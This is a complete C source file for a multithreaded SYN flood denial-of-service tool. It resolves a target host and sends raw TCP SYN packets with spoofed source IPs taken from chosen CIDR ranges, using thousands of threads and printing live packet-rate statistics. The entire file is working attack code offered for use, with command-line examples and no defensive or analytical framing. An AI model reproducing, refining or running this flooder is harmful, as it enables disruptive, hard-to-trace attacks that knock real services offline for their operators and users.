/*
 * Advanced SYN Flooder: Version 2.0
 * - Auto-resolve hostnames/URLs to IPv4
 * - Randomized IP spoofing within CIDR ranges or custom list
 * - Dynamic thread management and real-time stats
 * - Proper IP+TCP header construction with checksum
 * - User-friendly CLI with ANSI colors
 *
 * Usage:
 *   ./synflooder -t <target> [-p port] [-d duration] [-T threads]
 *                [-r <cidr or file>] [-i interval]
 *
 * Example:
 *   ./synflooder -t example.com -p 80 -d 60 -T 2000 -r 10.0.0.0/8 -i 1
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <stdatomic.h>
#include <netdb.h>

#define DEFAULT_PORT      80
#define DEFAULT_DURATION  30      // seconds
#define DEFAULT_THREADS   1000
#define DEFAULT_INTERVAL  2       // seconds between stats
#define MAX_SPOOF_CIDR    10      // max entries
#define PACKET_SIZE       (sizeof(struct iphdr) + sizeof(struct tcphdr))

static atomic_ulong total_packets = 0;
static atomic_ulong total_sent = 0;
static volatile int keep_running = 1;
struct spoof_range { uint32_t base, mask; } spoof_list[MAX_SPOOF_CIDR];
int spoof_count = 0;

// ANSI colors
#define RED   "\x1b[31m"
#define GREEN "\x1b[32m"
#define YELLOW "\x1b[33m"
#define RESET "\x1b[0m"

// Signal handler
void handle_sig(int sig) {
    keep_running = 0;
}

// Compute checksum
unsigned short checksum(unsigned short *buf, int nwords) {
    unsigned long sum = 0;
    for (; nwords > 0; nwords--) sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// Parse CIDR (e.g. 192.168.0.0/16)
int add_spoof_cidr(const char *cidr) {
    if (spoof_count >= MAX_SPOOF_CIDR) return -1;
    char ip[32]; int prefix;
    if (sscanf(cidr, "%31[^/]/%d", ip, &prefix) != 2) return -1;
    struct in_addr addr;
    if (inet_pton(AF_INET, ip, &addr) != 1) return -1;
    spoof_list[spoof_count].mask = prefix>=0&&prefix<=32 ? htonl(~((1 << (32-prefix)) - 1)) : 0;
    spoof_list[spoof_count].base = addr.s_addr & spoof_list[spoof_count].mask;
    return spoof_count++;
}

// Generate random spoofed IP
uint32_t random_spoof_ip() {
    if (spoof_count == 0) return rand();
    int idx = rand() % spoof_count;
    uint32_t mask = ntohl(spoof_list[idx].mask);
    uint32_t base = ntohl(spoof_list[idx].base);
    uint32_t host = rand() & ~mask;
    struct in_addr r = { htonl(base | host) };
    return r.s_addr;
}

// Resolve target hostname to IPv4 address
int resolve_target(const char *host, struct sockaddr_in *sin) {
    struct addrinfo hints = { .ai_family = AF_INET, .ai_socktype = SOCK_STREAM };
    struct addrinfo *res;
    if (getaddrinfo(host, NULL, &hints, &res) != 0) return -1;
    sin->sin_family = AF_INET;
    sin->sin_port = 0;
    sin->sin_addr = ((struct sockaddr_in*)res->ai_addr)->sin_addr;
    freeaddrinfo(res);
    return 0;
}

// Build packet
void build_packet(char *packet, struct sockaddr_in *target, int port) {
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));

    // IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(PACKET_SIZE);
    iph->id = htons(rand());
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = random_spoof_ip();
    iph->daddr = target->sin_addr.s_addr;
    iph->check = 0;
    iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr)/2);

    // TCP header
    tcph->source = htons(rand() % 65535);
    tcph->dest = htons(port);
    tcph->seq = htonl(rand());
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(65535);
    tcph->check = 0;

    // Pseudo-header for checksum
    struct pseudo { uint32_t saddr, daddr; uint8_t zero; uint8_t proto; uint16_t len; } psh;
    psh.saddr = iph->saddr;
    psh.daddr = iph->daddr;
    psh.zero = 0;
    psh.proto = IPPROTO_TCP;
    psh.len = htons(sizeof(struct tcphdr));
    int psize = sizeof(psh) + sizeof(struct tcphdr);
    char *buf = malloc(psize);
    memcpy(buf, &psh, sizeof(psh));
    memcpy(buf + sizeof(psh), tcph, sizeof(struct tcphdr));
    tcph->check = checksum((unsigned short *)buf, psize/2);
    free(buf);
}

void *flood_thread(void *arg) {
    struct sockaddr_in *target = (struct sockaddr_in*)arg;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    char packet[PACKET_SIZE];
    while (keep_running) {
        build_packet(packet, target, ntohs(target->sin_port));
        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr*)target, sizeof(*target));
        atomic_fetch_add(&total_packets, 1);
    }
    close(sock);
    return NULL;
}

void print_usage() {
    printf(GREEN "Usage:" RESET " synflooder -t <target> [-p port] [-d duration] [-T threads] [-r cidr] [-i interval]\n");
}

int main(int argc, char **argv) {
    srand(time(NULL));
    signal(SIGINT, handle_sig);

    char *target_str = NULL;
    int port = DEFAULT_PORT;
    int duration = DEFAULT_DURATION;
    int threads = DEFAULT_THREADS;
    int interval = DEFAULT_INTERVAL;
    char opt;

    while ((opt = getopt(argc, argv, "t:p:d:T:r:i:h")) != -1) {
        switch (opt) {
            case 't': target_str = optarg; break;
            case 'p': port = atoi(optarg); break;
            case 'd': duration = atoi(optarg); break;
            case 'T': threads = atoi(optarg); break;
            case 'r': add_spoof_cidr(optarg); break;
            case 'i': interval = atoi(optarg); break;
            default: print_usage(); return 1;
        }
    }
    if (!target_str) { print_usage(); return 1; }

    struct sockaddr_in target;
    if (resolve_target(target_str, &target) < 0) {
        fprintf(stderr, RED "Error:" RESET " Unable to resolve target '%s'\n", target_str);
        return 1;
    }
    target.sin_port = htons(port);

    pthread_t tids[threads];
    printf(YELLOW "Starting SYN flood on %s:%d with %d threads for %d seconds..." RESET "\n", target_str, port, threads, duration);

    for (int i = 0; i < threads; i++) {
        pthread_create(&tids[i], NULL, flood_thread, &target);
    }

    for (int elapsed = 0; elapsed < duration && keep_running; elapsed += interval) {
        sleep(interval);
        unsigned long sent = atomic_exchange(&total_packets, 0);
        printf(GREEN "[%2d s] Packets/sec:" RESET " %10lu\n", elapsed+interval, sent);
    }
    keep_running = 0;

    for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
    printf(YELLOW "Attack finished. Total packets sent: %lu" RESET "\n", atomic_load(&total_packets) + 1);
    return 0;
}
